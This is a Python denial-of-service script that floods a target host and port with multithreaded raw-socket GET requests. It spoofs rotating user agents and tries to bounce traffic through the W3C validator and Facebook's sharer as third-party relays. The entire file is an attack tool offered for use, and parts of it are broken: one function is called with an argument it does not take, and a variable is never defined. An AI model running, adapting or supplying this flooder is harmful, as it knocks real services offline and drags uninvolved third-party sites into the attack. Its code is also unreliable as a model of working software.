from queue import Queue
from fake_useragent import UserAgent
import urllib.request
import requests
import socket
import threading
import random
import time

def useragents():
    ua = UserAgent()
    global uagent
    uagent = []
    for i in range(400):
        uagent.append(ua.firefox)
    return(uagent)

def bots():
    global bot
    bot = []
    bot.append("http://validator.w3.org/check?uri=")
    bot.append("http://www.facebook.com/sharer/sharer.php?=")
    return(bot)

def bots01():
    global bot
    bot = []
    bot.append("http://validator.w3.org/check?uri=")
    bot.append("http://www.facebook.com/sharer/sharer.php?=")
    return(bot)

def bot_rippering():
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print("Bot is rippering...")
            time.sleep(.1)
    except:
        req = requests.get("https://validator.w3.org")
        time.sleep(.1)

def bot_again_rippering():
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print("Bot again rippering...")
            time.sleep(.1)
    except:
        req = requests.get("https://validator.w3.org")
        time.sleep(.2)

def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\nUser-Agent: "+random.choice(uagent)+"\n"+data).encode('UTF-8')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, int(port)))
            if sock.sendto(packet, (host, int(port))):
                sock.shutdown(1)
                print(f"[{time.ctime(time.time())}] packet sent rippering")
            else:
                sock.shutdown(1)
                print("Shutdown")
    except socket.error as error:
        raise socket.error("Error an occurred: %s" % error)

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos01():
    while True:
        item = w.get()
        bot_rippering(random.choice(bot)+"http://"+host)
        w.task_done()

def dos02():
    while True:
        item = e.get()
        bot_again_rippering(random.choice(bot)+"http://"+host)
        e.task_done()

global host
host = "127.0.0.1"

global port
port = 5000

global thr
thr = 100

global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

q = Queue()
w = Queue()
e = Queue()

if __name__ == "__main__":
    useragents()
    bots()
    bots01()
    # Your banner code goes here
    time.sleep(5)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((host, int(port)))
    except socket.error as error:
        raise socket.error("Error an occurred: %s" % error)
    time.sleep(.1)
    while True:
        for i in range(int(thr)):
            thread = threading.Thread(target=dos,daemon=True).start()
            thread01 = threading.Thread(target=dos01,daemon=True).start()
            thread02 = threading.Thread(target=dos02,daemon=True).start()
        start = time.time()
        item = 0
        while True:
            if (item>1800):
                item = 0
                time.sleep(.1)
            item += 1
            q.put(item)
            w.put(item)
            e.put(item)
        q.join()
    w.join()
e.join()
